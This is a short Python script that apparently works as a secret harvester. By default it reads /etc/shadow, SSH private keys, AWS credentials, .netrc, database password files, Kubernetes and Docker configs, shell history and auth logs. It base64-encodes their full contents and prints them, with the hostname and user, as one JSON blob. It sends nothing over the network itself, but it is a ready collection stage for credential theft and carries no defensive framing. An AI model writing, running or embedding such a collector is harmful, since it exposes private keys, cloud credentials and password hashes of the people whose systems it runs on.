import os
import base64
import json
import stat
import sys

MAX_FILE_SIZE = 1 * 1024 * 1024
DEFAULT_TARGETS = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hostname",
    "/etc/hosts",
    "/etc/resolv.conf",
    "/etc/ssh/sshd_config",
    os.path.expanduser("~/.bash_history"),
    os.path.expanduser("~/.bashrc"),
    os.path.expanduser("~/.profile"),
    os.path.expanduser("~/.ssh/id_rsa"),
    os.path.expanduser("~/.ssh/id_ed25519"),
    os.path.expanduser("~/.ssh/authorized_keys"),
    os.path.expanduser("~/.ssh/config"),
    os.path.expanduser("~/.aws/credentials"),
    os.path.expanduser("~/.aws/config"),
    os.path.expanduser("~/.gitconfig"),
    os.path.expanduser("~/.netrc"),
    os.path.expanduser("~/.my.cnf"),
    os.path.expanduser("~/.pgpass"),
    os.path.expanduser("~/.kube/config"),
    os.path.expanduser("~/.docker/config.json"),
    "/var/log/auth.log",
    "/var/log/secure",
    "/var/log/syslog",
]

targets = sys.argv[1:] if len(sys.argv) > 1 else DEFAULT_TARGETS

results = {
    "hostname": __import__("socket").gethostname(),
    "user": os.environ.get("USER", "unknown"),
    "files": {},
}

for path in targets:
    path = os.path.abspath(os.path.expanduser(path))
    entry = {"path": path, "exists": False, "size": 0, "mode": None, "error": None}
    if os.path.exists(path):
        try:
            st = os.stat(path)
            entry["exists"] = True
            entry["size"] = st.st_size
            entry["mode"] = stat.filemode(st.st_mode)
            entry["modified"] = st.st_mtime

            if st.st_size > MAX_FILE_SIZE:
                entry["error"] = f"file too large ({st.st_size} bytes, max {MAX_FILE_SIZE})"
                entry["truncated"] = True
                with open(path, "rb") as f:
                    content = f.read(MAX_FILE_SIZE)
                entry["content_b64"] = base64.b64encode(content).decode()
            elif st.st_size == 0:
                entry["content_b64"] = ""
            else:
                with open(path, "rb") as f:
                    content = f.read()
                entry["content_b64"] = base64.b64encode(content).decode()

            if stat.S_ISLNK(st.st_mode):
                entry["symlink_target"] = os.readlink(path)
        except PermissionError as e:
            entry["error"] = f"permission denied: {e}"
        except Exception as e:
            entry["error"] = str(e)
    else:
        entry["error"] = "not found"

    results["files"][path] = entry

summary = {
    "total_targets": len(targets),
    "found": sum(1 for f in results["files"].values() if f["exists"]),
    "total_size": sum(f.get("size", 0) for f in results["files"].values() if f["exists"]),
}

results["summary"] = summary

print(json.dumps(results, indent=2, default=str))
